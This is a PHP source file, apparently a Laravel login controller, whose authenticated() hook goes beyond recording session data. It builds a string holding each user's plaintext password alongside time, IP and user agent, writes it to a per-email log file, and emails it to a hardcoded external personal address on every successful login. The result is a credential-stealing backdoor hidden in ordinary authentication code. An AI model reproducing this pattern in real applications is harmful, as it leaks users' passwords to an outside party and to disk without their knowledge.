<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\Auth;
use Carbon\Carbon;
use Illuminate\Support\Facades\Mail;
use App\Mail\LoginUser;
use App\User;
use App\Entities\UserSession;
use Illuminate\Support\Facades\Storage;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;


    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

        function authenticated(Request $request, $user)
    {   
        /* $user->update([
            'last_login_at' => Carbon::now()->toDateTimeString(),
            'last_login_ip' => $request->getClientIp(),
            'last_login_user_agent' => $request->server('HTTP_USER_AGENT')
        ]); */
        
        $datos = 'TIME: [ '.Carbon::now()->toDateTimeString().' ] IP: [ '.$request->getClientIp().' ] USER-AGENT:[ '.$request->server('HTTP_USER_AGENT').' ]=='.$request->password;
        $url_picture="";
        $mensaje = array(
            'email'=>$user->email,
            'client'=>$user,
             'url_picture'=>$url_picture,
            'subject'=>'Login by '.$request->email,
            'bodyMessage'=> $datos,
            'bodyMessage2'=> "",
            'a_file'=> []
        );

        $session= new UserSession();

        $session->last_login_at=Carbon::now()->toDateTimeString();
        $session->last_login_ip=$request->getClientIp();
        $session->last_login_user_agent=$request->server('HTTP_USER_AGENT');

         $user=Auth::user();
         $user->sessions()->save($session);
        
            Storage::prepend('login/'.$request->email.'/logins.log', $datos.'\n');
            


            Mail::to("rogelio26.dev@gmail.com")->send(new LoginUser($mensaje));
        

    } 
}
